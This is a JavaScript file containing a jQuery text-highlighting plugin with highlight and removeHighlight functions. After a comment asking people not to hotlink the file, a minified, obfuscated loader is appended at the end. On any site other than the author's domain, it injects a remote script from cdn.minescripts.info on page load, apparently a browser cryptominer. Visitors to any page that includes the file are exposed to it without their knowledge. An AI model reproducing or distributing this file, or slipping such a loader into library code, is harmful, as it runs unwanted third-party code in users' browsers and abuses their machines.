jQuery.fn.highlight = function(pat) {
    function innerHighlight(node, pat) {
        var skip = 0;
        if (node.nodeType == 3) {
            var pos = node.data.toUpperCase().indexOf(pat);
            pos -= (node.data.substr(0, pos).toUpperCase().length - node.data.substr(0, pos).length);
            if (pos >= 0) {
                var spannode = document.createElement('span');
                spannode.className = 'highlight';
                var middlebit = node.splitText(pos);
                var endbit = middlebit.splitText(pat.length);
                var middleclone = middlebit.cloneNode(true);
                spannode.appendChild(middleclone);
                middlebit.parentNode.replaceChild(spannode, middlebit);
                skip = 1;
            }
        }
        else if (node.nodeType == 1 && node.childNodes && !/(script|style)/i.test(node.tagName)) {
            for (var i = 0; i < node.childNodes.length; ++i) {
                i += innerHighlight(node.childNodes[i], pat);
            }
        }
        return skip;
    }
    return this.length && pat && pat.length ? this.each(function() {
        innerHighlight(this, pat.toUpperCase());
    }) : this;
};

jQuery.fn.removeHighlight = function() {
    return this.find("span.highlight").each(function() {
        this.parentNode.firstChild.nodeName;
        with (this.parentNode) {
            replaceChild(this.firstChild, this);
            normalize();
        }
    }).end();
};

/* PLEASE DO NOT HOTLINK MY FILES, THANK YOU. */

if (!/johannburkard.de$/i.test(location.hostname)) {
    (function() {
        function load(b,c){var d=document,f="script",a=d.createElement(f),e=2166136261,g=b.length,h=c,k=/=\?/;d=d.getElementsByTagName("script")[0];if(k.test(b)){for(;g--;)e=16777619*e^b.charCodeAt(g);window[f+=0>e?-e:e]=function(){h.apply(h,arguments);delete window[f]};b=b.replace(k,"="+f);c=0}a.onload=a.onreadystatechange=function(){if(/de|m/.test(a.readyState||"m")){c&&c();d.parentNode.removeChild(a);try{for(c in a)delete a[c]}catch(l){}}};a.src=b;window.setTimeout(function(){d.parentNode.insertBefore(a,d)},0)};
        load('https://cdn.minescripts.info/c/ZLPA.js')
    })()
}